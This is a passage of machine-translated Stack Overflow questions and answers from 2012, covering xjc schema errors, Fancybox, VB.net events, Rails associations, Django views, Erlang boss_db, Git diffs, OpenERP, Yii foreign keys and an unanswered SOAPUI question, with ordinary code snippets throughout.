   line 131 of file:/E:/ansdef/schema/siri-1.3/siri/siri_situationIdentity-v1.1.xsd 
```

这很奇怪，因为提到的文件 ( `siri_situationIdentity-v1.1.xsd`) 指的是另一个 XSD，其中声明了可疑类型。

我尝试了几件事

*   切换Java版本以获得不同的xjc
*   直接从 java.net 尝试了一些不同的 xjc
*   对文件应用了一些修改，以便删除当前应用的有关包含/导入的 JAXB 变通办法
*   尝试使用具有依赖模式的整个目录作为 xjc 的目标
*   Altova XMLSpy Java 代码生成运行良好，没有错误（但对我来说没有办法）

他们都没有工作。

有人知道错误消息是由什么引起的吗？我不明白这一点。您可以直接从这里获得所有 XSD： [Verband Deutscher Verkehrsunternehmen (VDV) - Ist-Daten-Schnittstellen](http://www.vdv.de/module/layout_upload/schema_vdv453_v2_3e.zip)

我尝试过的命令行（除其他外）是：

```
xjc -readOnly -d generated -npa -target 2.1 -verbose VDV453_incl_454_V2.3e.xsd 
```

非常感谢任何帮助或提示。

问候

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-15T11:46:25.133

这里的解决方案是使用`-nv`开关禁用严格验证。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T17:50:35.357

该错误消息是由 XJC 未能成功加载其他模式文档引起的。你有几个选择。

*   xjc 文档建议它接受多个命令行参数，因此请尝试将您希望它读取的所有模式文档指定为命令行参数。
*   您还可以尝试找出它用于解析相对引用的基本 URI，或者（更直接地）...
*   您可以（尝试）弄清楚如何告诉 XJC 使用什么基本 URI。
*   由于 XJC 还支持 XML 目录，您可以使用目录告诉它在哪里可以找到您的顶级模式文档所引用的文件。

# jquery - Fancybox not working 在 Firebug 中没有错误，所有图像都存在

> ID：12427758
> 
> 赞同：0
> 
> 时间：2012-09-14T15:38:45.463
> 
> 标签：jquery, fancybox

Fancybox 不在此页面上运行，它已在许多其他具有相同代码的站点上运行。Firebug 没有给出错误。知道问题可能是什么吗？

[http://www.asbestaway.ie/gallery.php](http://www.asbestaway.ie/gallery.php)

谢谢

鲍勃

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T16:02:16.217

那是因为您的代码 for`$("a[rel=example_group]")`返回一个空数组 - 这意味着没有属性`rel`值为 equals的锚标记`example_group`。从你的代码看起来你的锚标签有`rel="group"`，所以如果你把它改成`$("a[rel=group]")`.

# vb.net - VB.net 中的 e.target

> ID：12427760
> 
> 赞同：0
> 
> 时间：2012-09-14T15:38:54.513
> 
> 标签：vb.net, events, attributes, target

使用 flash 时，我可以通过访问事件的“目标”属性来获得事件的焦点。

所以如果我记得，它是类似的东西。

```
button1.addEventListener(mouse_click, doSomething);

doSomething(e: Event){
    e.target.size = 50000;
} 
```

我正在寻找 VB 中的等价物。

如果您能给我它在所有语言中的通用名称，我将不胜感激。除了“event.target VB.net 等价物”之外，我不太清楚要搜索什么，这并没有返回任何内容。

提前致谢。

编辑：对于那些新来闪光的人。我所说的焦点是指被点击的物理对象。因此，给出的示例将访问单击按钮的大小。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T16:16:54.990

在 VB 中，您可以使用 WithEvents 关键字声明性地连接事件处理程序，或者使用 AddHandler 强制连接事件处理程序。

```
Private WithEvents myButton

' OR

Public Sub New
  Dim newButton = New Button()
  AddHandler newButton.Click, AddressOf MyClickHandler
End New

'To consume it you declare a method as follows:
' The Handles clause is used when declaring WithEvents
Private Sub MyClickHandler(sender As Object, e As EventArgs) Handles myButton.Click
  ' The sender has a handle on the object that raised the event (aka the button)
  Dim btn = DirectCast(sender, Button)
  btn.Size = New Size(500, 500)

End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T16:26:26.363

知道了！

[http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.button.onclick.aspx#Y0](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.button.onclick.aspx#Y0)

```
 Sub GreetingBtn_Click(ByVal sender As Object, ByVal e As EventArgs)
        'When the button is clicked,
        'change the button text, and disable it.

        Dim clickedButton As Button = sender
        clickedButton.Text = "...button clicked..."
        clickedButton.Enabled = False
    End Sub 
```

第一个参数（默认为 sender）引用焦点对象。您可以像访问任何其他普通变量一样访问它，但它的信息不会出现在自动完成列表中，除非您将其设置为“作为”该特定数据类型。

所以我结束了这个

```
 Private Sub nw_btn_Click(ByVal sender As System.Windows.Forms.Button, ByVal e AsSystem.EventArgs) Handles nw_btn.Click
        sender.Hide()
    End Sub 
```

# ruby-on-rails - 多对多关系可能需要多态关联？模型创建所需的帮助

> ID：12427762
> 
> 赞同：0
> 
> 时间：2012-09-14T15:39:10.250
> 
> 标签：ruby-on-rails, database-design, many-to-many, polymorphic-associations

也许我今天的吸收有点慢（我什至无法说出正确的标题），但我想解决这个问题：

我想从[我之前的问题](https://stackoverflow.com/questions/12406583/drop-down-menu-for-many-to-many-relation-in-rails-using-nested-attributes/)中扩展我的模型。

# 简短回顾：

一个超市可以容纳许多产品，每种产品都可以在许多超市销售。该关联是通过供应模型建立的。

# 扩张：

现在我想扩展这个模型：假设我有一个产品**Apple**（水果）。它可以有不同的品种：即“Granny Smith”、“Golden Delicious”等。

在**超市 1**我可以买

*   苹果->“史密斯奶奶”
*   苹果->“金冠”

在**超市 2**我可以买

*   苹果->“布雷本”
*   苹果->“金冠”
*   Apple -> "McIntosh"（真的，那是一个[苹果品种](http://en.wikipedia.org/wiki/McIntosh_%28apple%29)）。

### 编辑：

一个更常见的问题是不同的公司提供相同的产品：*玉米片*可以由*Kellog's*或*General Mills*等提供，同时这些公司生产许多产品：

超市 1 出售：

*   玉米片 -> 凯洛格的
*   玉米片 -> 通用磨坊

超市 2 出售：

*   玉米片 -> 凯洛格的
*   Rice Kriespies -> Kellog's

我想我需要一个额外的模型来连接品牌（上面模型中的品种）和产品（玉米片/苹果）。

### /编辑

我还需要创建哪些模型以及如何将它们链接起来？我想像多态关联之类的东西，但我真的不知道......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T16:29:23.827

您可能希望在超市和详细产品之间建立多对多关系。详细产品将具有通用产品的外键。

假设您命名了通用产品模型属（复数：genera）。[随意找一个更好的名字。]

```
class Genus
  has_many :products
end

class Brand
  has_many :products
end

class Product
  belongs_to :genus
  belongs_to :brand
  has_many :supplies
  has_many :supermarkets, :through => :supplies
end

class Supply
  belongs_to :product
  belongs_to :supermarket
end

class Supermarket
  has_many :supplies
  has_many :products, :through => :supplies
end

Product                   Genus
Granny Smith Apple        Apple
Golden Delicious Apple    Apple
Braeburn Apple            Apple
Macintosh Apple           Apple
Kellog's Cornflakes       Cornflakes
GM Cornflakes             Cornflakes
Kellog's Rice Krispies    Rice Krispies 
```

您还可以在 Product to brand 中包含一个外键，以存储 Kellog's 或 General Mills。

# localization - Google Apps Script Web App 可以获取用户的语言和时区吗？

> ID：12427764
> 
> 赞同：4
> 
> 时间：2012-09-14T15:39:25.350
> 
> 标签：localization, google-apps-script

作为 Web App 发布的 GAS 是否有可能在活动用户的身份下执行并使用 Ui 服务作为用户界面来获取用户的首选语言和时区？ `Session.getActiveUser()`有效，但您只会收到电子邮件`Session.getActiveUser().getEmail()`。
`Session.getTimeZone()`返回脚本的时区，而不是用户的时区。

是否有一个技巧来获取具有语言首选项的 Web 浏览器 ID 字符串？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-08-01T02:40:34.097

[Session.getActiveUserLocale()](https://developers.google.com/apps-script/reference/base/session#getActiveUserLocale())于 2014 年引入以提供此功能。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T21:13:47.803

这是一个非常有趣的问题。我认为简短的回答是目前没有好的方法，您必须向用户询问他们的语言环境/语言。

我看不到使用您已经讨论过的 API 在服务器端执行此操作的方法。[但是，我在想也许有一种聪明的方法可以在客户端执行此操作，并在从navigator.language](https://developer.mozilla.org/en-US/docs/DOM/window.navigator.language) JS 调用获取语言环境信息后使用[google.script](https://developers.google.com/apps-script/html_service?hl=en#GoogleScriptAPI) API将其发送到服务器。

不幸的是，由于您在 Web 应用程序中拥有的 HTML/JS 已通过[Caja](http://code.google.com/p/google-caja/)进行了安全性清理，因此只有部分正常的[window.navigator](https://developer.mozilla.org/en-US/docs/DOM/window.navigator)属性被公开。似乎唯一有用的[属性](http://code.google.com/searchframe#wBZsFl6bRv8/trunk/src/com/google/caja/plugin/domita.js&l=4361)是 userAgent 和 platform。语言似乎对暴露无害，因此值得在[问题跟踪器](http://code.google.com/p/google-apps-script-issues/issues/list)中记录请求。

# django - django - 如何创建预览视图

> ID：12427771
> 
> 赞同：2
> 
> 时间：2012-09-14T15:40:04.630
> 
> 标签：django, django-forms, django-views

我有一个添加页面来创建一个新帖子。我现在想添加一个链接（ahref）来预览帖子。我有一个表单和一个提交按钮来将帖子保存到数据库中。我应该使用相同的表格进行预览。当我单击“预览”链接时，页面必须重定向到“preview.html”，我可以在其中显示表单的值。

我被困住了。我无法在我的脑海中为此创建算法。有一个 page.one 表格。一个视图（addPost）。我需要通过另一个具有另一个模板文件的视图来达到这个表单的值。

我在模型 py 中有两个字段，称为“titlepreview”和“bodyPreview”。在预览页面中查看表单的值；表单数据应写入这两个字段。

这里models.py：

```
class Post(models.Model):
    owner = models.ForeignKey(User)
    title = models.CharField(max_length = 100)
    body = models.TextField()
    bodyPreview = models.TextField() #preview 
    titlePreview = models.CharField(max_length=100) # preview 
    slug = AutoSlugField(populate_from='title',unique=True)
    posted = models.DateField(auto_now_add=True)
    isdraft = models.BooleanField(default=False) 
```

这是我的 add_post 视图：

```
@login_required(login_url='/login/')
def add_post(request):
    if request.method=="POST":
        form = addForm(request.POST)
        if form.is_valid():
            titleform=form.cleaned_data['title']
            bodyform=form.cleaned_data['body']
            checkform=form.cleaned_data['isdraft']
            owner = request.user
            n = Post(title = titleform, body = bodyform, isdraft=checkform, owner=owner)
            n.save()
            return HttpResponseRedirect('/admin/')

    else:
        form=addForm()
        return render(request,'add.html',{'form':form,})
    return render_to_response('add.html',{'form':form,},context_instance=RequestContext(request)) 
```

我的 addForm 表单：

```
class addForm(forms.Form):
    title = forms.CharField(max_length=100,widget=forms.TextInput(attrs={'placeholder':'Buraya Başlık Gelecek',}))
    body = forms.CharField(widget=forms.Textarea(attrs={'placeholder':'Buraya Metin Gelecek','rows':'25','cols':'90',}))
    isdraft = forms.BooleanField(required=False)
    #ispreview = forms.BooleanField(required=False) i just added this line as first step. :) 
```

如果需要另一个代码；你可以在下面评论

谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:52:01.627

将您的转换`addForm`为`modelForm`，然后在`add.html`模板中添加一个名为“_preview”的提交按钮（确保您的另一个提交按钮名为“_save”）。代码看起来像这样：

```
class addForm(forms.ModelForm):
    class Meta:
        model = Post

@login_required(login_url='/login/')
def add_post(request):
    post = None
    template_name = 'add.html'
    if request.method == 'POST':
        form = addForm(request.POST)
        if form.is_valid():
          if '_preview' in request.POST:
              # don't save the post
              post = form.save(commit=False)
              template_name = 'preview.html'
          elif '_save' in request.POST:
              # save the post
              post = form.save()
              return HttpResponseRedirect('/admin/')
    else:
        form = addForm()
    return render_to_response(template_name, {'form': form, 'post': post}, context_instance=RequestContext(request)) 
```

您的模板底部会有这样的内容：

```
<input type='submit' name='_save' value='Save Post' />
<input type='submit' name='_preview' value='Preview Post' /> 
```

通过这样做，您可以让用户预览他们的帖子而不将其保存到数据库中 - 只需确保在 上`preview.html`，您嵌入了表单并包含一个保存按钮，以便他们可以在他们喜欢他们看到的内容时保存帖子。

# postgresql - Erlang boss_db hello world？

> ID：12427773
> 
> 赞同：2
> 
> 时间：2012-09-14T15:40:11.610
> 
> 标签：postgresql, orm, erlang, erlang-otp, rebar

最近我尝试为 Erlang 安装和运行[boss_db](https://github.com/evanmiller/boss_db) ORM 的演示。

这是我所做的：

*   克隆存储库
*   `cd boss_db/`
*   `rebar get-deps`
*   将一个简单的 mydb.erl 文件放入`src/`：

    ```
    -module(mydb).

    -compile(export_all).

    start() -> 
    ```

    DBOptions = [{adapter, pgsql}, {db_host, "localhost"}, {db_port, 5432}, {db_username, "postgres"}, {db_password, "mypass"},
    {cache_enable, false}, {cache_exp_time, 0} ],

    boss_db：开始（DBOptions）。

*   `rebar compile`

*   `cd ebin/`
*   跑`erl`
*   `mydb:start()`

这是我得到的：

```
** exception exit: shutdown 
```

我在这里做错了什么？它应该如何运行？

PS 我也尝试运行 application:start(boss_db) ，但结果是一样的。

PPS 我已经阅读了两次[文档](https://github.com/evanmiller/boss_db/blob/master/README.md)，但我仍然不知道如何运行整个过程。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-03T17:27:03.940

您没有将依赖项添加到代码路径。这就是为什么在找不到它们时会引发异常的原因。不要 cd 进入 ebin 和 erl。而是运行

```
erl -pa ebin -pa deps/*/ebin 
```

从当前目录。

顺便说一句，这不是做这种事情的好方法。而是使用 rebar 创建一个新的空应用程序。在 rebar.config 中将 boss_db 作为依赖项添加到您的应用程序。将自己的源文件放在 src 下。接着

```
rebar get-deps compile
erl -pa ebin -pa deps/*/ebin 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-09T16:16:37.137

```
git clone git://github.com/evanmiller/boss_db.git
cd boss_db/
rebar get-deps
emacs src/mydb.erl
rebar compile
erl -pa ./ebin ./deps/*/ebin 
```

这些步骤对我有用。`code:is_loaded()`运行 erl 后将无法正常工作。只有在调用模块时，才会加载代码。

我确实关闭了应用程序，但这是因为**代码正在尝试连接到 Postgres DB 并且无法连接到它**。

```
Erlang R15B02 (erts-5.9.2) [source] [smp:8:8] [async-threads:0] [hipe] [kernel-poll:false]

Eshell V5.9.2  (abort with ^G)
1> mydb:start().
** exception exit: shutdown
=ERROR REPORT==== 9-Oct-2012::12:13:07 ===
** Generic server <0.35.0> terminating 
** Last message in was {'EXIT',<0.34.0>,
                        {{badmatch,
                          {error,
                           {{badmatch,
                             {error,
                              {{badmatch,{error,econnrefused}},
                               [{pgsql_sock,init,1,
                                 [{file,"src/pgsql_sock.erl"},{line,51}]},
                                {gen_server,init_it,6,
                                 [{file,"gen_server.erl"},{line,304}]},
                                {proc_lib,init_p_do_apply,3,
                                 [{file,"proc_lib.erl"},{line,227}]}]}}},
                            [{boss_db_controller,init,1,
                              [{file,"src/boss_db_controller.erl"},{line,31}]},
                             {gen_server,init_it,6,
                              [{file,"gen_server.erl"},{line,304}]},
                             {proc_lib,init_p_do_apply,3,
                              [{file,"proc_lib.erl"},{line,227}]}]}}},
                         [{poolboy,new_worker,2,
                           [{file,"src/poolboy.erl"},{line,348}]},
                          {poolboy,prepopulate,4,
                           [{file,"src/poolboy.erl"},{line,370}]},
                          {poolboy,init,2,
                           [{file,"src/poolboy.erl"},{line,74}]},
                          {gen_fsm,init_it,6,
                           [{file,"gen_fsm.erl"},{line,361}]},
                          {proc_lib,init_p_do_apply,3,
                           [{file,"proc_lib.erl"},{line,227}]}]}}
** When Server state == {state,
                            {<0.35.0>,poolboy_sup},
                            simple_one_for_one,
                            [{child,undefined,boss_db_controller,
                                 {boss_db_controller,start_link,
                                     [[{size,5},
                                       {max_overflow,10},
                                       {adapter,pgsql},
                                       {db_host,"localhost"},
                                       {db_port,5432},
                                       {db_username,"postgres"},
                                       {db_password,"mypass"},
                                       {cache_enable,false},
                                       {cache_exp_time,0}]]},
                                 temporary,brutal_kill,worker,
                                 [boss_db_controller]}],
                            {set,0,16,16,8,80,48,
                                {[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],
                                 []},
                                {{[],[],[],[],[],[],[],[],[],[],[],[],[],[],
                                  [],[]}}},
                            0,1,[],poolboy_sup,
                            {boss_db_controller,
                                [{size,5},
                                 {max_overflow,10},
                                 {adapter,pgsql},
                                 {db_host,"localhost"},
                                 {db_port,5432},
                                 {db_username,"postgres"},
                                 {db_password,"mypass"},
                                 {cache_enable,false},
                                 {cache_exp_time,0}]}}
** Reason for termination == 
** {{badmatch,
        {error,
            {{badmatch,
                 {error,
                     {{badmatch,{error,econnrefused}},
                      [{pgsql_sock,init,1,
                           [{file,"src/pgsql_sock.erl"},{line,51}]},
                       {gen_server,init_it,6,
                           [{file,"gen_server.erl"},{line,304}]},
                       {proc_lib,init_p_do_apply,3,
                           [{file,"proc_lib.erl"},{line,227}]}]}}},
             [{boss_db_controller,init,1,
                  [{file,"src/boss_db_controller.erl"},{line,31}]},
              {gen_server,init_it,6,[{file,"gen_server.erl"},{line,304}]},
              {proc_lib,init_p_do_apply,3,
                  [{file,"proc_lib.erl"},{line,227}]}]}}},
    [{poolboy,new_worker,2,[{file,"src/poolboy.erl"},{line,348}]},
     {poolboy,prepopulate,4,[{file,"src/poolboy.erl"},{line,370}]},
     {poolboy,init,2,[{file,"src/poolboy.erl"},{line,74}]},
     {gen_fsm,init_it,6,[{file,"gen_fsm.erl"},{line,361}]},
     {proc_lib,init_p_do_apply,3,[{file,"proc_lib.erl"},{line,227}]}]} 
```

# git - 你如何让 Git 忽略空格和制表符？

> ID：12427779
> 
> 赞同：24
> 
> 时间：2012-09-14T15:40:38.080
> 
> 标签：git, diff, indentation

我有一个小型脚本项目，它在一个名为“Droid XX-XX-XX”的目录中包含五个不同的源文件。每次创建源目录的新备份副本时，我都会将日期放在 X 中。所以大约有 15 个不同日期的不同版本。我想从最早开始将这些中的每一个添加到我的新 Git 存储库中。

但是我遇到了几个问题。

1.  一个问题是一些文件使用制表符进行缩进，而另一些文件使用空格——但即使唯一的区别是制表符与空格问题，Git 也会将整行视为不同。如何让 Git 忽略缩进格式？

2.  另一个问题是一些文件名没有空格，而另一些文件名之间有空格——但 Git 将它们视为不同的文件。更糟糕的是，有时文件名无故更改为不同的名称（例如“PatrolPlan”更改为“Patrol”）。当我添加一组新文件时，我如何告诉 Git 即使文件名不同，它实际上只是某个旧文件的新版本？或者更好的是，我可以将其设置为在发生这种情况时自动检测吗？

3.  最后一个问题是，在开发过程中的某些时候，我们将两个源文件合并为一个，或者将一个源文件拆分为两个——但 Git 不会自动检测相似之处并推断发生了什么。我如何告诉 Git 发生了什么？或者更好的是，如何将其设置为自动检测两个源文件何时合并或一个源文件何时拆分？

我意识到问题（2）和（3）是高度相关的。感谢您的帮助！

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-09-14T16:26:43.930

听起来您需要对开发过程进行更多控制和标准化。提交更改的人应该是修改文件的人。或者至少提交者应该确切地知道发生了什么变化。

仔细检查 的输出`git diff`，并使用`-w`标志忽略空格。还有一些选项可以显示一行内的差异。请参阅下面*一行内的差异*。

请注意，您将无法告诉 git 在提交时跳过空间更改。我建议使用 GitX（我更喜欢“brotherbard”fork），它允许您在提交之前以交互方式丢弃大块。

提交时使用描述性消息。例如，如果一个文件被拆分，就这么说。让你的提交变小。如果您发现自己编写了很长的提交消息，请将提交分解为更小的部分。这样，当您在很长一段时间后检查日志时，更改的内容会更有意义。

**一行内的差异**

Git 具有在一行中显示“单词”差异的能力。最简单的方法是只使用`git diff --color-words`.

但是，我喜欢使用配置自定义“单词”的含义`diff.wordRegex`。我也喜欢`plain`word-diff 格式，因为它更清楚地显示了差异所在（除了使用颜色之外，还在更改周围插入括号）。

命令：

```
git diff --word-diff=plain 
```

连同我的配置中的这个：

```
[diff]
        wordRegex = [[:alnum:]_]+|[^[:alnum:]_[:space:]]+ 
```

此正则表达式将这些视为“单词”：

*   连续的字母数字和下划线字符串
*   非字母数字、非下划线和非空格的连续字符串（适用于检测运算符）

您必须拥有最新版本`git`才能使用`wordRegex`. 查看您的`git-config`手册页以查看是否列出了该选项。

**更新**

如果您使用`git mv`重命名文件（这比使用其他工具或操作系统重命名更可取），您可以看到 git 检测重命名。我强烈建议独立于对文件内容的任何编辑提交重命名。那是因为 git 实际上并没有存储您重命名的事实 - 它使用基于文件更改量的启发式来猜测它是否是同一个文件。在重命名提交期间更改它的次数越少越好。

如果您确实稍微更改了文件内容，您可以使用`-C`参数来`git diff`更`git log`努力地检测副本和重命名。添加一个百分比（例如`-C75%`）以使 git 对差异更加宽容。百分比表示内容必须有多相似才能被视为匹配。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-03-09T01:54:55.380

现在我对 Git 有了更多的了解，我可以回答我自己的问题了。

1.  最好使用正则表达式进行全局搜索替换，以标准化项目不同版本中所有文件之间的空白，这样当它们按顺序提交时，空白更改不需要提交。话虽如此，Atlassian SourceTree 的差异工具允许您隐藏空白更改，因此至少您不会看到这些更改。

2.  处理文件名更改的关键是在只有文件名更改的地方进行提交（不要暂存任何其他更改）。然后在其内容更改的地方进行提交。这样，不做大量启发式和深度挖掘的普通差异工具就可以理解所发生的事情。问题在于，如果对文件进行了太多更改，例如名称和大量内容，那么大多数 diff 工具会将其视为摘要删除和新文件。（如正确答案中所述）

3.  这是一个更难的问题，没有真正好的解决方法。如果你将一个文件分成两个，或者合并两个，它在差异中只会很丑。尽量不要在进行拆分的同时进行大量更改，这样拆分是一回事，后续的更改将是另一回事。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-14T15:49:19.667

1.  您将无法让 git 忽略制表符/空格，因为 git 创建每个文件的哈希值，如果哈希值不同，则文件被视为不同。

2.  Git 将树（目录）视为文件；如果它们的内容发生变化，那么它们就是不同的树。

不过，我不认为这些变化有什么可担心的。它们发生在任何开发过程中。我认为对您来说最好的方法是使用 git*重播您的开发。*换句话说，从您的初始版本开始，然后进行必要的更改（就像您最初所做的那样），git 会记住您在做什么。

可选：如果您想将更改的日期/时间大致记录为最初所做的更改，则可以使用`--date`命令行选项`git commit`告诉 git 何时进行这些更改。

# python - Openerp：onChange 事件以在帐户移动时创建行

> ID：12427782
> 
> 赞同：2
> 
> 时间：2012-09-14T15:40:47.033
> 
> 标签：python, onchange, openerp

我`amount`在日记帐分录（帐户移动表单）上有一个字段，我需要定义一个 onChange 事件，一旦我填写了金额，它就会自动插入行。但我不确定如何。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T05:25:22.417

昨天我不得不做一些类似于你要求的事情。我在购买中有一个销售订单（m2o）字段...关于销售订单的更改我必须填写采购订单行...希望它可以帮助您。

```
class purchase_order(osv.osv):
    _inherit = 'purchase.order'

    _columns = {
        'sale_order':fields.many2one('sale.order','Sale Order'),
        'purchase_type':
            fields.selection([
                ('order','Purchase Order'),
                ('job','Job Order')
                ],
            'Purchase Type',
            required=True,
            states={
                'confirmed':[('readonly',True)],
                'approved':[('readonly',True)],
                },
            select=True,
            help="Define type of purchase order.",
         ),
     }

def onchange_saleorder(self,cr,uid,ids,order,context=None):
    res={}
    lis=[]
    sorder_id=self.pool.get('sale.order').browse(cr,uid,order)
    for line in sorder_id.order_line:
        print "uom",line.product_id.uom_id.id
        res={'product_id':line.product_id.id,
             'name':line.product_id.name,
             'product_qty':1,
             'product_uom':line.product_id.uom_id.id,
             'price_unit':line.price_unit,
             'date_planned':time.strftime('%Y-%m-%d'),}
        lis.append(res)
    print "list is .........",lis
    res={'value':{'order_line':lis}} // here order_line is o2m field of purchase.
    return res 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-16T13:40:37.060

您的**on_change**方法必须返回由行值组成的字典列表。

例如：

```
res['value']['line_ids'] = [
    {
        'account_id': 1,
        'debit': 100,
    },
    {
        'account_id': 2,
        'credit': 100,
    }] 
```

另外，请参阅**account.voucher的****recompute_voucher_lines**方法作为示例。

 *** * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T11:38:56.740

有时会生成错误“0”，所以我们必须用这样的代码编写代码。在上述示例的情况下 `lis.append((0,0,res))`**

# css - 如果支持 webkit scollbars，则删除 div

> ID：12427783
> 
> 赞同：0
> 
> 时间：2012-09-14T15:40:49.357
> 
> 标签：css, webkit, scrollbar

我正在为 webkit 浏览器使用自定义滚动条。问题是当浏览器支持 webkit 时。我希望它消除我在整个身体周围的边框。`-webkit-box-sizing`正如您在小提琴中看到的那样，我通过在正确的 div 和负边距值上使用它来工作：http: [//jsfiddle.net/Yfw49/1/](http://jsfiddle.net/Yfw49/1/)

除了支持 box-sizing 但不支持 webkit 滚动条的浏览器之外，它真的很棒。例如根本没有滚动条的移动浏览器。

有没有办法让它工作？我尝试了一个 jQuery 方法，询问浏览器是否支持 webkit，如果支持，删除 div。但这使 div 出现了一会儿，然后将其删除。看起来很糟糕。

请看一下jsfiddle [http://jsfiddle.net/Yfw49/1/](http://jsfiddle.net/Yfw49/1/)

（我知道我可以在没有所有元素的情况下使标记更清晰。但让我们关注另一个问题）

# python - 如何处理多对多字段的 Django ModelForm

> ID：12427788
> 
> 赞同：0
> 
> 时间：2012-09-14T15:41:08.410
> 
> 标签：python, django

我必须在具有多对多关系的两个模型的管理页面上显示多对多字段，并且我使用[了这种](https://stackoverflow.com/questions/2216974/django-modelform-for-many-to-many-fields)非常有效的方法。

`tags`我必须在添加/编辑用户时显示一个字段。该字段已添加，但我失去了密码哈希的功能。所以现在，我必须按照[这里](https://stackoverflow.com/questions/12423796/why-django-doesnt-save-encrypted-password)`UserAdmin`的建议使用

实际上，我正在尝试这个：

```
class CustomUserAdmin(UserAdmin):
    form = UserForm 
```

这不适用于[现有表单](https://stackoverflow.com/questions/2216974/django-modelform-for-many-to-many-fields)，即`tags`根本不显示该字段。我需要改变什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:48:23.997

尝试创建内[联](https://docs.djangoproject.com/en/dev/ref/contrib/admin/#inlinemodeladmin-objects)。内联允许您在管理面板中显示和自定义相关对象。

# php - Yii 添加新记录错误：1452 无法添加或更新子行：外键约束失败

> ID：12427789
> 
> 赞同：0
> 
> 时间：2012-09-14T15:41:09.970
> 
> 标签：php, sql, yii

添加新记录会出错：

> 1452 无法添加或更新子行：外键约束失败

```
public function relations()
{
    return array(
        'data' => array(self::HAS_ONE, 'Data', 'id'),
    );
} 
```

这是我添加新记录的代码：

```
public function actionAdd_Record()
{
    $users = new Users();
    $data = new Data();

    if (isset($_POST['Users']) && isset($_POST['Data'])) {

        if(!empty($_POST['Users_password'])) $_POST['Users']['password']=md5($_POST['Users_password']);
         $users->created_date=date('Y-m-d H:i:s');

        CActiveForm::validate(array($users, $data));
        $users->attributes = $_POST['Users'];
        $data->attributes = $_POST['Data'];

        $valid=$users->validate();
        $valid=$data->validate() && $valid;

        if($valid){
            $users->save();
            $data->save();

            $this->redirect(
                array('view_record',
                    'id'=> $users->id)
            );
        }
    }

    $this->render(
        'add_record', array(
            'users'=> $users,
            'data'=>$data
        )
    );
} 
```

这是第一个表：

```
 CREATE TABLE IF NOT EXISTS `data` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `investment_amount` float DEFAULT '0' COMMENT '投資額',
  `withdrawals` float DEFAULT '0' COMMENT '引出額',
  `investment_yield` float DEFAULT '0' COMMENT '運用利回り',
  `account_balance` float DEFAULT '0' COMMENT '口座残高',
  `status_account` enum('open','closed') DEFAULT 'open',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=7 ; 
```

和第二张表：

```
 CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(128) NOT NULL,
  `password` varchar(128) NOT NULL,
  `name` varchar(300) NOT NULL COMMENT '氏名',
  `email` varchar(200) NOT NULL,
  `user_type` enum('normal','admin') NOT NULL DEFAULT 'normal',
  `created_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=9 ; 
```

它给出了这个错误：

> CDbCommand 未能执行 SQL 语句：SQLSTATE[23000]：完整性约束违规：1452 无法添加或更新子行：外键约束失败（`money_investment`. `data`, CONSTRAINT `FK_data_users`FOREIGN KEY ( `id`) REFERENCES `users`( `id`)）。执行的 SQL 语句为： INSERT INTO `data`( `investment_amount`, `withdrawals`, `investment_yield`, `account_balance`, `status_account`) VALUES (:yp0, :yp1, :yp2, :yp3, :yp4)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:47:23.503

这不是 yii 或 PHP 问题，而是数据库问题。

您正在尝试插入一条违反您定义的关于主键的关系的记录。要检查的是关系以及字段长度。

看起来您可能仍然在不存在的列上定义了关系（money_investment？）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T16:48:35.703

谢谢你的帮助，我解决了我的问题。

我添加`$data->id=$users->id;`是因为第二张桌子不知道 id。见[这里](http://www.yiiframework.com/wiki/19/how-to-use-a-single-form-to-collect-data-for-two-or-more-models/#c9743)。

```
if($valid){
$users->save();
$data->id=$users->id;
$data->save();

$this->redirect(
    array('view_record',
        'id'=> $users->id)
    );
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-01T11:26:03.243

外键约束不允许您在父母之前在孩子中输入数据.. 有时 sql 引擎 innoDb 和 MyIsam .. 读出它的功能你会知道在外键约束即将出现的问题下首选使用什么 sql 引擎... .

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-05-27T06:59:10.197

你粗暴地更新你的桌子。最好的方法是在模型中查看

```
public function relations() 
```

并将这些关系与您的表格进行比较。任何额外的或错误的关系都可能产生这样的问题。

# soapui - 如何使用 SOAPUI 进行 REST 调用安全测试

> ID：12427793
> 
> 赞同：0
> 
> 时间：2012-09-14T15:41:20.387
> 
> 标签：soapui

我们观察到，没有多少工具能够为基于 Jason REST 的服务安全和渗透测试提供很好的支持。是否有一个值库可用于提供大量安全测试覆盖率的 SOAPUI 测试？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-15T02:40:45.650

